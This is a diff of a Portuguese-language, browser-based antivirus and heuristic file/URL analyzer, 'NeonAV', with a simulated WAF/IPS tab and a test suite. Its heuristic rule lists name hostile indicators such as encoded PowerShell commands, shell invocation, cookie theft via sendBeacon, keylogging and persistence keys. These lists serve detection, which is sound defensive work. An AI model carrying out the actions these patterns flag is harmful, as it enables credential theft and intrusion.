+                <h2>📋 Laudos Técnicos</h2>
 
-<div class="dropzone" id="dropzone">
-<div>
-<div class="drop-icon">📁</div>
-<strong>Arraste arquivos aqui</strong>
-<div style="margin:8px;color:var(--muted)">ou utilize o botão abaixo</div>
-<input type="file" id="fileInput" multiple style="display:none">
-<button class="btn primary" id="selectBtn">Selecionar arquivos</button>
-</div>
-</div>
+                <div class="filters">
+                    <input id="searchInput" placeholder="🔎 Filtrar por nome, SHA-512, URL ou IOC...">
+                    <select id="riskFilter">
+                        <option value="all">Todos os níveis</option>
+                        <option value="low">Baixo (0–24)</option>
+                        <option value="medium">Médio (25–49)</option>
+                        <option value="high">Alto (50–74)</option>
+                        <option value="critical">Crítico (75–100)</option>
+                    </select>
+                    <select id="sortSelect">
+                        <option value="new">Mais recentes</option>
+                        <option value="score">Maior pontuação</option>
+                        <option value="name">Nome (A–Z)</option>
+                        <option value="size">Tamanho</option>
+                    </select>
+                </div>
 
-<!-- Seção de Análise de URL -->
-<div style="margin-top:15px; border-top:1px solid var(--border); padding-top:15px;">
-    <label class="metric-title" style="display:block; margin-bottom:8px;">🌐 Analisar URL / Website</label>
-    <div style="display:flex; gap:10px;">
-        <input type="url" id="urlInput" placeholder="https://exemplo.com" style="flex:1;">
-        <button class="btn primary" id="scanUrlBtn" style="white-space:nowrap;">Analisar URL</button>
+                <div id="results" class="results">
+                    <div class="empty">Nenhum laudo gerado ainda.</div>
+                </div>
+            </section>
+        </main>
+
+        <aside>
+            <section class="panel">
+                <h2>📊 Distribuição de Risco</h2>
+                <div class="metric-title">Score Médio</div>
+                <div class="metric-value green" id="averageScore">0</div>
+
+                <div class="stats-bar">
+                    <div class="stats-label"><span>Baixo</span><span id="lowPercent">0%</span></div>
+                    <div class="stats-track"><div class="stats-fill" id="lowFill" style="width:0%"></div></div>
+                </div>
+                <div class="stats-bar">
+                    <div class="stats-label"><span>Médio</span><span id="mediumPercent">0%</span></div>
+                    <div class="stats-track"><div class="stats-fill" id="mediumFill" style="width:0%;background:var(--yellow)"></div></div>
+                </div>
+                <div class="stats-bar">
+                    <div class="stats-label"><span>Alto</span><span id="highPercent">0%</span></div>
+                    <div class="stats-track"><div class="stats-fill" id="highFill" style="width:0%;background:var(--orange)"></div></div>
+                </div>
+                <div class="stats-bar">
+                    <div class="stats-label"><span>Crítico</span><span id="criticalPercent">0%</span></div>
+                    <div class="stats-track"><div class="stats-fill" id="criticalFill" style="width:0%;background:var(--red)"></div></div>
+                </div>
+            </section>
+
+            <section class="panel">
+                <h2>⚙️ Parâmetros do Motor</h2>
+                <div class="toggle">
+                    <span>Extrair URLs e IPs (IOCs)</span>
+                    <input type="checkbox" id="cfgUrls" checked>
+                </div>
+                <div class="toggle">
+                    <span>Cálculo de Entropia Shannon</span>
+                    <input type="checkbox" id="cfgEntropy" checked>
+                </div>
+                <div class="toggle">
+                    <span>Verificar Extensão & Magic Bytes</span>
+                    <input type="checkbox" id="cfgExtension" checked>
+                </div>
+                <div class="toggle">
+                    <span>Assinaturas Heurísticas & Phishing</span>
+                    <input type="checkbox" id="cfgIoc" checked>
+                </div>
+
+                <div style="margin-top:15px">
+                    <label class="metric-title" for="sizeLimit">Tamanho Máximo por Arquivo</label>
+                    <select id="sizeLimit">
+                        <option value="5">5 MB</option>
+                        <option value="10" selected>10 MB</option>
+                        <option value="25">25 MB</option>
+                        <option value="50">50 MB</option>
+                    </select>
+                </div>
+            </section>
+
+            <section class="panel">
+                <h2>📝 Auditoria do Sistema</h2>
+                <div class="log" id="log"></div>
+            </section>
+        </aside>
     </div>
 </div>
 
-<div class="actions" style="margin-top:15px;">
-<button class="btn primary" id="scanBtn">🛡️ Iniciar análise da fila</button>
-<button class="btn blue" id="testBtn">🧪 Arquivos de teste</button>
-<button class="btn" id="jsonBtn">JSON</button>
-<button class="btn" id="csvBtn">CSV</button>
-<button class="btn" id="htmlBtn">Relatório HTML</button>
-<button class="btn danger" id="clearBtn">Limpar</button>
-</div>
-
-<div class="progress">
-<div class="progress-bar" id="progressBar"></div>
-</div>
-
-<div class="progress-text" id="progressText">
-Aguardando arquivos ou URLs...
-</div>
-</section>
-
-<section class="panel">
-<h2>📋 Resultados</h2>
-
-<div class="filters">
-<input id="searchInput" placeholder="🔎 Pesquisar arquivo, hash, URL ou IOC...">
-<select id="riskFilter">
-<option value="all">Todos os riscos</option>
-<option value="low">Baixo</option>
-<option value="medium">Médio</option>
-<option value="high">Alto</option>
-<option value="critical">Crítico</option>
-</select>
-<select id="sortSelect">
-<option value="new">Mais recentes</option>
-<option value="score">Maior risco</option>
-<option value="name">Nome</option>
-<option value="size">Tamanho</option>
-</select>
-</div>
-
-<div id="results" class="results">
-<div class="empty">Nenhum arquivo ou URL analisada.</div>
-</div>
-</section>
-
-</main>
-
-<aside>
-
-<section class="panel">
-<h2>📊 Estatísticas</h2>
-<div class="metric-title">Média de risco</div>
-<div class="metric-value green" id="averageScore">0</div>
-
-<div class="stats-bar">
-<div class="stats-label">
-<span>Baixo</span>
-<span id="lowPercent">0%</span>
-</div>
-<div class="stats-track"><div class="stats-fill" id="lowFill" style="width:0%"></div></div>
-</div>
-
-<div class="stats-bar">
-<div class="stats-label">
-<span>Médio</span>
-<span id="mediumPercent">0%</span>
-</div>
-<div class="stats-track"><div class="stats-fill" id="mediumFill" style="width:0%"></div></div>
-</div>
-
-<div class="stats-bar">
-<div class="stats-label">
-<span>Alto</span>
-<span id="highPercent">0%</span>
-</div>
-<div class="stats-track"><div class="stats-fill" id="highFill" style="width:0%"></div></div>
-</div>
-
-<div class="stats-bar">
-<div class="stats-label">
-<span>Crítico</span>
-<span id="criticalPercent">0%</span>
-</div>
-<div class="stats-track"><div class="stats-fill" id="criticalFill" style="width:0%"></div></div>
-</div>
-</section>
-
-<section class="panel">
-<h2>⚙️ Configurações</h2>
-<div class="toggle">
-<span>Detectar URLs</span>
-<input type="checkbox" id="cfgUrls" checked>
-</div>
-<div class="toggle">
-<span>Analisar entropia</span>
-<input type="checkbox" id="cfgEntropy" checked>
-</div>
-<div class="toggle">
-<span>Detectar extensões suspeitas</span>
-<input type="checkbox" id="cfgExtension" checked>
-</div>
-<div class="toggle">
-<span>Detectar IOCs & Phishing</span>
-<input type="checkbox" id="cfgIoc" checked>
-</div>
-
-<div style="margin-top:15px">
-<label class="metric-title">Limite por arquivo</label>
-<select id="sizeLimit">
-<option value="5">5 MB</option>
-<option value="10" selected>10 MB</option>
-<option value="25">25 MB</option>
-<option value="50">50 MB</option>
-</select>
-</div>
-</section>
-
-<section class="panel">
-<h2>📝 Log</h2>
-<div class="log" id="log">
-<div class="log-line">
-<span class="log-time">[READY]</span> NeonAV inicializado.
-</div>
-</div>
-</section>
-
-</aside>
-
-</div>
-
-</div>
-
-
-<!-- ================= AB 2: BLOQUEIO DE ATAQUES (FIREWALL / IPS) ================= -->
+<!-- ================= ABA 2: SIMULAÇÃO DE FIREWALL / IPS ================= -->
 <div id="firewallTab" class="tab-content">
 
-<section class="panel" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;">
-<div>
-    <h2 style="margin-bottom: 5px;">🛡️ Módulo de Bloqueio de Ataques em Tempo Real (Firewall IPS)</h2>
-    <div style="color: var(--muted); font-size: 13px;">Monitoramento de perímetro de rede, mitigações automáticas e inspeção profunda de pacotes.</div>
-</div>
-<div style="display: flex; align-items: center; gap: 15px;">
-    <div class="toggle" style="border: none; padding: 0;">
-        <span style="font-weight: bold; color: var(--green);">Proteção Ativa</span>
-        <input type="checkbox" id="ipsToggle" checked style="width: 20px; height: 20px; accent-color: var(--green);">
+    <div class="context-banner sim">
+        <span><strong>Ambiente de Simulação Educativa:</strong> Navegadores web operam em sandbox e não interceptam pacotes de rede do sistema operacional. Os eventos abaixo simulam regras de WAF/IPS para treinamento e demonstração.</span>
     </div>
-    <button class="btn primary" id="simulateAttackBtn">⚡ Simular Ataque de Teste</button>
-    <button class="btn danger" id="clearAttacksBtn">Limpar Histórico</button>
-</div>
-</section>
 
-<!-- Métricas de Ataques -->
-<div class="firewall-grid">
-    <div class="fw-card ddos">
-        <div class="fw-title">Ataques DDoS Bloqueados</div>
-        <div class="fw-count blue" id="countDdos">0</div>
-        <div style="font-size: 11px; color: var(--muted); margin-top: 5px;">Volume de pacotes / IP spoofing</div>
-    </div>
-    <div class="fw-card xss">
-        <div class="fw-title">Tentativas de XSS</div>
-        <div class="fw-count yellow" id="countXss">0</div>
-        <div style="font-size: 11px; color: var(--muted); margin-top: 5px;">Injeção de scripts maliciosos</div>
-    </div>
-    <div class="fw-card sql">
-        <div class="fw-title">SQL Injections Bloqueadas</div>
-        <div class="fw-count orange" id="countSql">0</div>
-        <div style="font-size: 11px; color: var(--muted); margin-top: 5px;">Tentativas de vazamento de banco</div>
-    </div>
-    <div class="fw-card brute">
-        <div class="fw-title">Brute Force / Credenciais</div>
-        <div class="fw-count red" id="countBrute">0</div>
-        <div style="font-size: 11px; color: var(--muted); margin-top: 5px;">Tentativas de força bruta em login</div>
-    </div>
-</div>
+    <section class="panel" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:15px;">
+        <div>
+            <h2 style="margin-bottom:5px;">🛡️ Simulador de Perímetro WAF / IPS</h2>
+            <div style="color:var(--muted); font-size:13px;">Teste o comportamento de bloqueio diante de vetores DDoS, XSS, SQLi e Brute Force.</div>
+        </div>
+        <div style="display:flex; align-items:center; gap:12px; flex-wrap:wrap;">
+            <div class="toggle" style="border:none; padding:0;">
+                <span style="font-weight:bold; color:var(--green);">Mitigação Ativa</span>
+                <input type="checkbox" id="ipsToggle" checked style="width:18px; height:18px;">
+            </div>
+            <button class="btn primary" id="simulateAttackBtn">⚡ Simular Vetor Aleatório</button>
+            <button class="btn danger" id="clearAttacksBtn">Zerar Simulação</button>
+        </div>
+    </section>
 
-<div class="main" style="grid-template-columns: 1fr;">
-<section class="panel">
-    <h2>📡 Feed de Eventos de Bloqueio em Tempo Real</h2>
-    <div style="margin-bottom: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
-        <button class="btn blue" onclick="triggerAttack('ddos')">Simular DDoS</button>
-        <button class="btn warning" onclick="triggerAttack('xss')">Simular XSS</button>
-        <button class="btn warning" onclick="triggerAttack('sql')">Simular SQL Injection</button>
-        <button class="btn danger" onclick="triggerAttack('brute')">Simular Brute Force</button>
+    <div class="firewall-grid">
+        <div class="fw-card ddos">
+            <div class="fw-title">[SIM] DDoS Mitigados</div>
+            <div class="fw-count blue" id="countDdos">0</div>
+        </div>
+        <div class="fw-card xss">
+            <div class="fw-title">[SIM] Payloads XSS</div>
+            <div class="fw-count yellow" id="countXss">0</div>
+        </div>
+        <div class="fw-card sql">
+            <div class="fw-title">[SIM] SQL Injections</div>
+            <div class="fw-count orange" id="countSql">0</div>
+        </div>
+        <div class="fw-card brute">
+            <div class="fw-title">[SIM] Brute Force</div>
+            <div class="fw-count red" id="countBrute">0</div>
+        </div>
     </div>
-    <div class="attack-feed" id="attackFeed">
-        <div class="empty">Nenhum ataque interceptado recentemente. O Firewall está operando normalmente.</div>
-    </div>
-</section>
+
+    <section class="panel">
+        <h2>📡 Log de Eventos Simulados</h2>
+        <div style="margin-bottom:15px; display:flex; gap:10px; flex-wrap:wrap;" id="simTriggerGroup">
+            <button class="btn blue" data-attack="ddos">Simular DDoS</button>
+            <button class="btn warning" data-attack="xss">Simular XSS</button>
+            <button class="btn warning" data-attack="sql">Simular SQLi</button>
+            <button class="btn danger" data-attack="brute">Simular Brute Force</button>
+        </div>
+        <div class="attack-feed" id="attackFeed"></div>
+    </section>
 </div>
 
-</div>
+<!-- ================= ABA 3: TESTES AUTOMATIZADOS ================= -->
+<div id="qaTab" class="tab-content">
 
+    <div class="context-banner qa">
+        <span><strong>Suíte de Verificação Automatizada (11 Testes):</strong> Valida sanitização XSS, validação de URL/arquivo, entropia de Shannon, SHA-512, heurística, classificação de risco, ordenação, filtros e exportação JSON/CSV.</span>
+    </div>
+
+    <section class="panel" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:15px;">
+        <div>
+            <h2 style="margin-bottom:5px;">🧪 Diagnóstico & Testes Unitários (11 Asserções)</h2>
+            <div style="color:var(--muted); font-size:13px;">Executa asserções reais contra as funções internas do NeonAV 2.0.</div>
+        </div>
+        <button class="btn purple" id="runTestsBtn">▶ Executar 11 Testes</button>
+    </section>
+
+    <div class="test-summary">
+        <div class="card">
+            <div class="metric-title">Total de Testes</div>
+            <div class="metric-value purple" id="qaTotal">0</div>
+        </div>
+        <div class="card">
+            <div class="metric-title">Aprovados (PASS)</div>
+            <div class="metric-value green" id="qaPassed">0</div>
+        </div>
+        <div class="card">
+            <div class="metric-title">Falhas (FAIL)</div>
+            <div class="metric-value red" id="qaFailed">0</div>
+        </div>
+        <div class="card">
+            <div class="metric-title">Tempo de Execução</div>
+            <div class="metric-value blue" id="qaTime">0 ms</div>
+        </div>
+    </div>
+
+    <section class="panel">
+        <h2>📋 Resultados das Asserções</h2>
+        <div id="qaResults">
+            <div class="empty">Clique em "Executar 11 Testes" para iniciar a validação.</div>
+        </div>
+    </section>
+</div>
 
 <div class="footer">
-NeonAV Secure PRO ULTRA • Suporte Android, iOS e Windows • Uso defensivo
+    NeonAV Secure PRO ULTRA 2.0 • Análise Estática Local & Laboratório Educativo • Uso Defensivo
 </div>
 
 </div>
 
+<!-- Modal de Amostras Sintéticas -->
+<div class="modal" id="testModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal-box">
+        <button class="close" id="closeModal" aria-label="Fechar">×</button>
+        <h2 id="modalTitle">🧪 Gerador de Amostras Sintéticas (Inofensivas)</h2>
+        <p style="color:var(--muted); font-size:13px;">
+            Gera arquivos em memória marcados como <strong>[AMOSTRA SINTÉTICA]</strong> para validar o comportamento do motor heurístico sem riscos.
+        </p>
 
-<div class="modal" id="testModal">
-<div class="modal-box">
-<button class="close" id="closeModal">×</button>
-<h2>🧪 Laboratório de testes</h2>
-<p style="color:var(--muted)">
-Estes arquivos são gerados localmente e não contêm malware real.
-Eles servem apenas para testar as heurísticas do NeonAV.
-</p>
-
-<div class="test-file">
-<div><strong>Arquivo limpo</strong><div class="meta">Texto sem indicadores</div></div>
-<button class="btn primary" data-test="clean">Adicionar</button>
+        <div class="test-file">
+            <div><strong>Documento Limpo (.txt)</strong><div class="meta">Texto comum sem padrões suspeitos</div></div>
+            <button class="btn primary" data-test="clean">Adicionar à Fila</button>
+        </div>
+        <div class="test-file">
+            <div><strong>Script Ofuscado (.js)</strong><div class="meta">Simula eval(), atob() e captura de teclado</div></div>
+            <button class="btn warning" data-test="js">Adicionar à Fila</button>
+        </div>
+        <div class="test-file">
+            <div><strong>Coletor de Sessão (.js)</strong><div class="meta">Simula leitura de cookie/localStorage + sendBeacon</div></div>
+            <button class="btn warning" data-test="stealer">Adicionar à Fila</button>
+        </div>
+        <div class="test-file">
+            <div><strong>Dropper PowerShell (.ps1)</strong><div class="meta">Simula -EncodedCommand e Invoke-Expression</div></div>
+            <button class="btn danger" data-test="powershell">Adicionar à Fila</button>
+        </div>
+        <div class="test-file">
+            <div><strong>Página de Phishing (.html)</strong><div class="meta">Formulário de senha apontando para destino externo</div></div>
+            <button class="btn danger" data-test="phishing">Adicionar à Fila</button>
+        </div>
+    </div>
 </div>
-
-<div class="test-file">
-<div><strong>Teste JavaScript</strong><div class="meta">Simula indicadores de keylogger/obfuscação</div></div>
-<button class="btn warning" data-test="js">Adicionar</button>
-</div>
-
-<div class="test-file">
-<div><strong>Teste Stealer</strong><div class="meta">Simula indicadores de coleta de dados</div></div>
-<button class="btn warning" data-test="stealer">Adicionar</button>
-</div>
-
-<div class="test-file">
-<div><strong>Teste PowerShell</strong><div class="meta">Simula comandos PowerShell suspeitos</div></div>
-<button class="btn danger" data-test="powershell">Adicionar</button>
-</div>
-
-<div class="test-file">
-<div><strong>Teste de Phishing / Formulário Falso</strong><div class="meta">Simula campos de senha falsos e ação externa</div></div>
-<button class="btn danger" data-test="phishing">Adicionar</button>
-</div>
-
-<div class="test-file">
-<div><strong>Teste crítico</strong><div class="meta">Combinação de vários indicadores</div></div>
-<button class="btn danger" data-test="critical">Adicionar</button>
-</div>
-</div>
-</div>
-
 
 <script>
 "use strict";
 
 /* =========================================================
-   CONTROLES DA CAPA (BOTÕES CLICÁVEIS)
+   1. UTILITÁRIOS SEGUROS & VALIDAÇÃO DE ENTRADAS
 ========================================================= */
-const coverScreen = document.getElementById("coverScreen");
-const coverStartBtn = document.getElementById("coverStartBtn");
-const coverTestBtn = document.getElementById("coverTestBtn");
-const testModal = document.getElementById("testModal");
+const $ = id => document.getElementById(id);
 
-coverStartBtn.addEventListener("click", () => {
-    coverScreen.classList.add("hidden");
-});
-
-coverTestBtn.addEventListener("click", () => {
-    coverScreen.classList.add("hidden");
-    testModal.classList.add("show");
-});
-
-/* =========================================================
-   NAVEGAÇÃO POR ABAS
-========================================================= */
-const tabButtons = document.querySelectorAll(".tab-btn");
-const tabContents = document.querySelectorAll(".tab-content");
-
-tabButtons.forEach(btn => {
-    btn.addEventListener("click", () => {
-        const targetTab = btn.getAttribute("data-tab");
-        
-        tabButtons.forEach(b => b.classList.remove("active"));
-        tabContents.forEach(c => c.classList.remove("active"));
-        
-        btn.classList.add("active");
-        document.getElementById(targetTab).classList.add("active");
-    });
-});
-
-/* =========================================================
-   CONFIGURAÇÃO & ESTADO
-========================================================= */
-const STORAGE_KEY = "neonav-secure-pro-ultra-v2";
-const FIREWALL_STORAGE_KEY = "neonav-firewall-events-v1";
-
-let filesQueue = [];
-let resultsData = [];
-let scanning = false;
-
-// Estado do Firewall / IPS
-let firewallStats = {
-    ddos: 14,
-    xss: 29,
-    sql: 18,
-    brute: 12
-};
-
-let firewallEvents = [
-    { id: uuid(), type: 'ddos', name: 'Ataque DDoS Volumétrico (SYN Flood)', ip: '185.220.101.5', timestamp: Date.now() - 120000, details: '45,000 req/s bloqueadas na borda' },
-    { id: uuid(), type: 'xss', name: 'Injeção de Script Malicioso (XSS Refletido)', ip: '45.154.255.88', timestamp: Date.now() - 300000, details: 'Payload detectado em parâmetro GET' },
-    { id: uuid(), type: 'sql', name: 'Tentativa de SQL Injection (UNION SELECT)', ip: '194.26.29.11', timestamp: Date.now() - 600000, details: 'Consulta maliciosa interceptada no ORM' },
-    { id: uuid(), type: 'brute', name: 'Força Bruta em Painel Administrativo', ip: '103.152.68.9', timestamp: Date.now() - 950000, details: '120 tentativas de login falhas por minuto' }
-];
-
-/* =========================================================
-   REGRAS HEURÍSTICAS
-========================================================= */
-const RULES = [
-{
-    name:"Formulário de Senha Suspeito",
-    score:9,
-    patterns:[
-        'type="password"',
-        "type='password'",
-        'name="password"',
-        "name='password'",
-        'name="senha"',
-        "name='senha'",
-        'name="passwd"',
-        "name='passwd'",
-        'autocomplete="current-password"',
-        'autocomplete="new-password"'
-    ]
-},
-{
-    name:"Formulário com Ação Externa",
-    score:8,
-    patterns:[
-        'action="http://',
-        "action='http://",
-        'action="//',
-        "action='//"
-    ]
-},
-{
-    name:"Keylogger",
-    score:8,
-    patterns:[
-        "keydown",
-        "keypress",
-        "keyup",
-        "document.onkeydown",
-        "keyboardevent",
-        "addEventListener('keydown'",
-        "addEventListener(\"keydown\""
-    ]
-},
-{
-    name:"Stealer",
-    score:10,
-    patterns:[
-        "localStorage",
-        "sessionStorage",
-        "document.cookie",
-        "sendBeacon",
-        "navigator.sendBeacon",
-        "fetch(",
-        "xmlhttprequest"
-    ]
-},
-{
-    name:"Obfuscação",
-    score:7,
-    patterns:[
-        "eval(",
-        "atob(",
-        "btoa(",
-        "Function(",
-        "fromCharCode",
-        "unescape(",
-        "decodeURIComponent("
-    ]
-},
-{
-    name:"PowerShell",
-    score:7,
-    patterns:[
-        "powershell",
-        "powershell.exe",
-        "-encodedcommand",
-        "invoke-expression",
-        "iex ",
-        "set-executionpolicy"
-    ]
-},
-{
-    name:"Shell",
-    score:6,
-    patterns:[
-        "/bin/sh",
-        "/bin/bash",
-        "cmd.exe",
-        "shell_execute",
-        "child_process",
-        "exec("
-    ]
-},
-{
-    name:"Download",
-    score:5,
-    patterns:[
-        "download",
-        "createObjectURL",
-        "application/octet-stream",
-        "wget ",
-        "curl "
-    ]
-},
-{
-    name:"Persistência",
-    score:8,
-    patterns:[
-        "startup",
-        "autorun",
-        "runonce",
-        "scheduled task",
-        "crontab",
-        "registry"
-    ]
-},
-{
-    name:"Credenciais",
-    score:9,
-    patterns:[
-        "password",
-        "passwd",
-        "credential",
-        "token",
-        "authorization",
-        "bearer "
-    ]
-},
-{
-    name:"Rede suspeita",
-    score:5,
-    patterns:[
-        "websocket",
-        "socket",
-        "ftp://",
-        "irc://"
-    ]
+function escapeHTML(value) {
+    return String(value ?? "")
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
 }
+
+function uuid() {
+    if (window.crypto && typeof window.crypto.randomUUID === "function") {
+        return window.crypto.randomUUID();
+    }
+    const arr = new Uint8Array(16);
+    if (window.crypto && window.crypto.getRandomValues) {
+        window.crypto.getRandomValues(arr);
+    } else {
+        for (let i = 0; i < 16; i++) arr[i] = Math.floor(Math.random() * 256);
+    }
+    return Array.from(arr, b => b.toString(16).padStart(2, "0")).join("");
+}
+
+function formatBytes(bytes) {
+    const num = Number(bytes);
+    if (!Number.isFinite(num) || num <= 0) return "0 B";
+    const units = ["B", "KB", "MB", "GB"];
+    const i = Math.min(Math.floor(Math.log(num) / Math.log(1024)), units.length - 1);
+    return (num / Math.pow(1024, i)).toFixed(i === 0 ? 0 : 2) + " " + units[i];
+}
+
+function formatDate(ts) {
+    try {
+        return new Date(ts).toLocaleString("pt-BR");
+    } catch {
+        return "Data inválida";
+    }
+}
+
+function validateURLInput(raw) {
+    const trimmed = String(raw || "").trim();
+    if (!trimmed) {
+        return { valid: false, error: "Informe uma URL para análise." };
+    }
+    if (trimmed.length > 2048) {
+        return { valid: false, error: "URL excede o limite de 2048 caracteres." };
+    }
+    if (/\s/.test(trimmed)) {
+        return { valid: false, error: "A URL não pode conter espaços em branco." };
+    }
+
+    const withScheme = /^[a-zA-Z][a-zA-Z\d+\-.]*:\/\//.test(trimmed) ? trimmed : "http://" + trimmed;
+    let parsed;
+    try {
+        parsed = new URL(withScheme);
+    } catch {
+        return { valid: false, error: "Formato de URL inválido. Ex: https://dominio.com" };
+    }
+
+    if (!["http:", "https:"].includes(parsed.protocol)) {
+        return { valid: false, error: `Protocolo não suportado (${parsed.protocol}). Use HTTP ou HTTPS.` };
+    }
+
+    if (!parsed.hostname || (!parsed.hostname.includes(".") && parsed.hostname !== "localhost")) {
+        return { valid: false, error: "Host inválido ou incompleto." };
+    }
+
+    return { valid: true, url: parsed };
+}
+
+function validateFileInput(file, maxMB) {
+    if (!file || typeof file.name !== "string") {
+        return { valid: false, error: "Objeto de arquivo inválido." };
+    }
+    const cleanName = file.name.trim();
+    if (!cleanName) {
+        return { valid: false, error: "Arquivo sem nome." };
+    }
+    const maxBytes = maxMB * 1024 * 1024;
+    if (file.size > maxBytes) {
+        return { valid: false, error: `Excede o limite configurado de ${maxMB} MB (${formatBytes(file.size)}).` };
+    }
+    return { valid: true };
+}
+
+/* =========================================================
+   2. MOTOR CRIPTOGRÁFICO, HEURÍSTICO, FILTROS & EXPORTAÇÃO
+========================================================= */
+async function computeSHA512(buffer) {
+    if (window.crypto && window.crypto.subtle) {
+        const hashBuffer = await window.crypto.subtle.digest("SHA-512", buffer);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
+    }
+    throw new Error("WebCrypto API indisponível neste navegador.");
+}
+
+function calculateShannonEntropy(uint8Array) {
+    if (!uint8Array || uint8Array.length === 0) return 0;
+    const freq = new Uint32Array(256);
+    for (let i = 0; i < uint8Array.length; i++) {
+        freq[uint8Array[i]]++;
+    }
+    let entropy = 0;
+    const len = uint8Array.length;
+    for (let i = 0; i < 256; i++) {
+        if (freq[i] > 0) {
+            const p = freq[i] / len;
+            entropy -= p * Math.log2(p);
+        }
+    }
+    return Number(entropy.toFixed(3));
+}
+
+function detectMagicSignature(bytes) {
+    if (!bytes || bytes.length < 4) return "Desconhecido / Texto Curto";
+    const hex = Array.from(bytes.slice(0, 4)).map(b => b.toString(16).padStart(2, "0").toUpperCase()).join(" ");
+    if (bytes[0] === 0x4D && bytes[1] === 0x5A) return "Executável Windows (MZ/PE)";
+    if (bytes[0] === 0x7F && bytes[1] === 0x45 && bytes[2] === 0x4C && bytes[3] === 0x46) return "Executável Linux (ELF)";
+    if (bytes[0] === 0x50 && bytes[1] === 0x4B && bytes[2] === 0x03 && bytes[3] === 0x04) return "Arquivo Compactado / APK / JAR (ZIP)";
+    if (bytes[0] === 0x25 && bytes[1] === 0x50 && bytes[2] === 0x44 && bytes[3] === 0x46) return "Documento PDF";
+    return `Binário/Texto (${hex})`;
+}
+
+const HEURISTIC_RULES = [
+    { name: "Captura de Senha em Formulário", score: 15, patterns: ['type="password"', "type='password'", 'name="senha"', 'name="passwd"'] },
+    { name: "Envio Externo de Formulário", score: 18, patterns: ['action="http://', "action='http://", 'action="//'] },
+    { name: "Interceptação de Teclado (Keylogger)", score: 20, patterns: ["keydown", "keypress", "document.onkeydown", "keyboardevent"] },
+    { name: "Exfiltração / Coleta de Sessão (Stealer)", score: 22, patterns: ["document.cookie", "navigator.sendbeacon", "localstorage.getitem"] },
+    { name: "Ofuscação Dinâmica de Código", score: 16, patterns: ["eval(", "atob(", "function(", "fromcharcode", "unescape("] },
+    { name: "Execução PowerShell Suspeita", score: 25, patterns: ["powershell", "-encodedcommand", "invoke-expression", "iex ", "set-executionpolicy"] },
+    { name: "Chamada de Shell / Processo", score: 18, patterns: ["/bin/sh", "/bin/bash", "cmd.exe", "child_process", "shell_execute"] },
+    { name: "Persistência no Sistema", score: 20, patterns: ["currentversion\\run", "schtasks", "crontab", "autorun.inf"] }
 ];
 
 const SUSPICIOUS_EXTENSIONS = [
-".exe", ".scr", ".bat", ".cmd", ".ps1", ".vbs", ".vbe", ".js", ".jse", ".hta", ".msi", ".dll", ".jar", ".apk", ".com", ".pif", ".reg"
+    ".exe", ".scr", ".bat", ".cmd", ".ps1", ".vbs", ".vbe", ".js", ".jse", ".hta", ".msi", ".dll", ".jar", ".apk", ".com", ".pif", ".reg"
 ];
 
-const $ = id => document.getElementById(id);
+const SUSPICIOUS_TLDS = [".xyz", ".top", ".tk", ".ml", ".ga", ".cf", ".gq", ".work", ".click", ".zip", ".mov"];
 
-const fileInput = $("fileInput");
-const selectBtn = $("selectBtn");
-const dropzone = $("dropzone");
-const scanBtn = $("scanBtn");
-const resultsBox = $("results");
-const searchInput = $("searchInput");
-const riskFilter = $("riskFilter");
-const sortSelect = $("sortSelect");
-const progressBar = $("progressBar");
-const progressText = $("progressText");
-const status = $("status");
-const logBox = $("log");
+function extractIOCs(text) {
+    const iocs = new Set();
+    const urlMatches = text.match(/https?:\/\/[^\s"'<>()]{4,120}/gi) || [];
+    urlMatches.slice(0, 12).forEach(u => iocs.add(u));
 
-function escapeHTML(value){
-    return String(value ?? "")
-    .replace(/&/g,"&amp;")
-    .replace(/</g,"&lt;")
-    .replace(/>/g,"&gt;")
-    .replace(/"/g,"&quot;")
-    .replace(/'/g,"&#039;");
+    const ipMatches = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
+    ipMatches.forEach(ip => {
+        const parts = ip.split(".").map(Number);
+        if (parts.every(n => n >= 0 && n <= 255)) {
+            iocs.add("IP: " + ip);
+        }
+    });
+    return Array.from(iocs).slice(0, 15);
 }
 
-function formatBytes(bytes){
-    if(bytes === 0) return "0 B";
-    const units = ["B", "KB", "MB", "GB"];
-    const i = Math.floor(Math.log(bytes) / Math.log(1024));
-    return (bytes / Math.pow(1024,i)).toFixed(i === 0 ? 0 : 2) + " " + units[i];
+function classifyRisk(score) {
+    const n = Number(score);
+    if (!Number.isFinite(n) || n < 25) return { level: "low", label: "BAIXO" };
+    if (n < 50) return { level: "medium", label: "MÉDIO" };
+    if (n < 75) return { level: "high", label: "ALTO" };
+    return { level: "critical", label: "CRÍTICO" };
 }
 
-function formatDate(date){
-    return new Date(date).toLocaleString("pt-BR");
+function filterReports(list, { query = "", risk = "all" } = {}) {
+    const q = String(query).trim().toLowerCase();
+    return (Array.isArray(list) ? list : []).filter(item => {
+        if (risk !== "all" && item.riskLevel !== risk) return false;
+        if (!q) return true;
+        const nameMatch = String(item.name || "").toLowerCase().includes(q);
+        const hashMatch = String(item.hash || "").toLowerCase().includes(q);
+        const iocMatch = Array.isArray(item.iocs) && item.iocs.some(i => String(i).toLowerCase().includes(q));
+        return nameMatch || hashMatch || iocMatch;
+    });
 }
 
-function uuid(){
-    if(window.crypto && typeof window.crypto.randomUUID === "function"){
-        return window.crypto.randomUUID();
+function sortReports(list, sortBy = "new") {
+    const copy = Array.isArray(list) ? [...list] : [];
+    copy.sort((a, b) => {
+        if (sortBy === "score") return (b.score ?? 0) - (a.score ?? 0);
+        if (sortBy === "size") return (b.size ?? 0) - (a.size ?? 0);
+        if (sortBy === "name") return String(a.name || "").localeCompare(String(b.name || ""));
+        return (b.timestamp ?? 0) - (a.timestamp ?? 0);
+    });
+    return copy;
+}
+
+function buildJSONExport(data) {
+    return JSON.stringify(Array.isArray(data) ? data : [], null, 2);
+}
+
+function buildCSVExport(data) {
+    const list = Array.isArray(data) ? data : [];
+    const header = ["Nome", "Origem", "Risco", "Score", "Tamanho_Bytes", "Entropia", "SHA512", "Data"];
